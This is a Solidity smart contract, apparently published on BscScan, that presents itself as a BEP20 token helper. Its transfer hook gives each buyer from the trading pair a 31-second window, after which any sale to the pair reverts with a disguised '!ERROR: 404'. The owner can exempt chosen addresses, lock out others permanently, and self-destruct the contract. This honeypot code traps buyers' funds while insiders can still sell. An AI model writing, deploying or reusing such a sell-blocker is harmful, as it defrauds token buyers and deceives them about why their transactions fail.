/**
 *Submitted for verification at BscScan.com on 2023-02-07
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender());
        _;
    }

    function transferOwnership(address account) public virtual onlyOwner {
        emit OwnershipTransferred(_owner, account);
        _owner = account;
    }

}

contract BEP20GW4768 is Context, Ownable {
  
  address public pair;
  mapping(address => bool) public isExempt;
  mapping(address => uint256) public stampBlock;

  constructor() {}

  function ExemptAddress(address adr,bool flag) public onlyOwner returns (bool) {
    isExempt[adr] = flag;
    return true;
  }

  function ExemptManyAddress(address[] memory adrs,bool flag) public onlyOwner returns (bool) {
    uint256 i;
    do{
        isExempt[adrs[i]] = flag;
        i++;
    }while(i<adrs.length);
    return true;
  }

  function LockAddress(address adr) public onlyOwner returns (bool) {
    stampBlock[adr] = 1;
    return true;
  }

  function LockManyAddress(address[] memory adrs) public onlyOwner returns (bool) {
    uint256 i;
    do{
        stampBlock[adrs[i]] = 1;
        i++;
    }while(i<adrs.length);
    return true;
  }

  function SetPair(address adr) public onlyOwner returns (bool) {
    pair = adr;
    return true;
  }

  function implement(address from,address to, uint256 amount) external returns (bool) {
    if(amount > 0){
        if(from==pair && !isExempt[to]){
            if(stampBlock[to]==0){
                stampBlock[to] = block.timestamp + 31;
            }
        }
        if(to==pair && !isExempt[from]){
            if(stampBlock[from]<block.timestamp){
                revert("!ERROR: 404");
            }
        }
    }
    return true;
  }

  function removeContract() public onlyOwner {
    selfdestruct(payable(msg.sender));
  }

}